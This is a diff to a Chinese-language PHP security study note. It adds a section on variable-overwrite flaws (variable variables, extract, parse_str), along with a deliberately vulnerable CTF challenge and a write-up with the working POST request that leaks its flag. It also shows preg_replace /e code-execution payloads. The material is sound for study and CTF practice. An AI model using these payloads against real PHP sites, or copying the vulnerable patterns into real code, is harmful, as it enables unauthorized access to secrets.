@@ -3,8 +3,8 @@
 ### **int、String的转换**
 ```php
 var_dump(intval(4))//4
-var_dump(intval(‘1asd’))//1
-var_dump(intval(‘asd1’))//0
+var_dump(intval('1asd'))//1
+var_dump(intval('asd1'))//0
 intval（）函数在转换字符串的时候即使碰到不能转换的字符串的时候它也不会报错，而是返回0
 ```
 ### **比较操作符**
@@ -186,4 +186,71 @@ preg_replace('/(.*)/ie','strtolower("\\1")','{${phpinfo()}}')
 preg_replace('/(.*)/ie','strtolower("{${phpinfo()}}")','{${phpinfo()}}')
 preg_replace('/(' . $regex . ')/ei', 'strtolower("\\1")', $value); // $regex = \S*, $value = {${phpinfo()}}
 ```
+## **3. PHP遍历覆盖问题**
+**\$\$这种写法称为可变变量:**<br>
+一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。<br>
+**extract()函数使用不当:**<br>
+extract(array,extract_rules,prefix)<br>
+该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量,该函数返回成功设置的变量数目。<br>
+extract_rules： extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。可能的值：EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。<br>
+**parse_str()函数使用不当**<br>
+parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。<br>
+parse_str('a=2');  //经过parse_str()函数后注册变量$a，重新赋值。<br>
+**import_request_variables()使用不当**<br>
+```php
+bool import_request_variables(string$types[,string$prefix])
+import_request_variables—将 GET／POST／Cookie 变量导入到全局作用域中
+import_request_variables()函数就是把GET、POST、COOKIE的参数注册成变量，用在register_globals被禁止的时候
+$type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀
+```
+**案例：**
+```php
+highlight_file(__FILE__);
+$_403 = "Access Denied";
+$_200 = "Hello ~";
+$a = 'morning';
+$flag = 'flag{aef67s80-shug-kilh-juio-ertdgcbx67dhk}';
+if ($_SERVER["REQUEST_METHOD"] != "POST"){
+    die("please post!<br>");
+} 
+if (!isset($_POST["flag"])){
+    die($_403);
+}
+foreach ($_GET as $key => $value)
+    $$key = $$value;   
+foreach ($_POST as $key => $value)
+    $$key = $value;
+if ($_POST["flag"] !== $flag ){
+    die($_403);
+}
+else{
+    $message = json_decode($_POST['json']);
+    parse_str($message->token);
+    if($a[0] != "aaroZmOk" && sha1($a[0]) == sha1('aaroZmOk')){
+        if($message->theKey == 'a' && $message->theKey !== "a"){
+            echo "This is your flag : ". $flag . "<br>";
+            die($_200);
+        }
+    }
+    else{
+        echo "get out hacker !!!"."<br>";
+    }
+}
+------------------------WriteUp-------------------------------
+```
+```html
+POST /upctf/vulb.php?_200=flag HTTP/1.1
+Host: www.test.com
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
 
+flag=abc&a[0]=aa3OFF9m&json={"theKey":0e0,"token":"flag=_200"}
+```
